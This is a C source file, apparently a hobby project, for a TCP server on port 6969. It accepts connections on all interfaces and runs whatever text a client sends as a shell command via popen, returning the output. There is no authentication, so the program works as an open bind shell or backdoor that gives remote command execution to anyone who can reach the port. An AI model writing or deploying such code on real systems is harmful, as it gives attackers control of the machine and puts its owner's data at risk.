#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>		// types for the sockets

#define SERVER_PORT 6969
#define BUFFER_SIZE 1024		// size depends on send/receive. Same as client

// We are communicating with client. This is where that gets handeled.
void handle_client(int client_sock) {
    char buffer[BUFFER_SIZE];		// declare buffer at given size
    int bytes_received;

    while((bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';  // null termination
        printf("Received command: %s", buffer);

        FILE *fp = popen(buffer, "r");		// same POSIX magic as client. Executes the received command as shell a
											// shell command. Read only
        if (fp == NULL) {		// check if fail
            send(client_sock, "Failed to execute command\n", strlen("Failed to execute command\n"), 0);
            continue;
        }

        memset(buffer, 0, BUFFER_SIZE);		// clear before reading
        size_t bytes_read;
        while ((bytes_read = fread(buffer, 1, BUFFER_SIZE - 1, fp)) > 0) {		// read the output of the command
            send(client_sock, buffer, bytes_read, 0);		// send
            memset(buffer, 0, BUFFER_SIZE);					// clear after send
        }
        pclose(fp);		// close pointer file created by popen
    }

    if (bytes_received == 0) {		// check results
        printf("Disconnected\n");	// good exit
    } else if (bytes_received == -1) {
        perror("recv");		// bad exit
    }

    close(client_sock);		// close the socket

}

int main() {
    int server_sock, client_sock;						// variables and structs to store addresses
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    server_sock = socket(AF_INET, SOCK_STREAM, 0);		// actual socket creation
    if (server_sock == -1) {
        perror("Socket creatuon failed!");
        return 1;
    }

    server_addr.sin_family = AF_INET;		// ipv4
    server_addr.sin_port = htons(SERVER_PORT);		// port number. htons converts port number to network byte order***
    server_addr.sin_addr.s_addr = INADDR_ANY;		// set to any available interface

	// bind socket to server address
    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Bind fail");
        close(server_sock);
        return 1;
    }

	// listen
    if (listen(server_sock, 5) == -1) {		// listen for up to 5 connections. Change per use case
        perror("Listen fail");
        close(server_sock);
        return 1;
    }

    printf("Server listening on port %d...\n", SERVER_PORT);

	// main loop to accept connections
    while (1) {
        client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len);  // accept client connect
        if (client_sock == -1) {
            perror("Accept fail");
            continue;
        }

		// convert address to string and print. Need to add ability to send commands and show progress here.
        printf("Client connected: %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        handle_client(client_sock);

    }

    close(server_sock);		// clean close socket
    return 0;
}
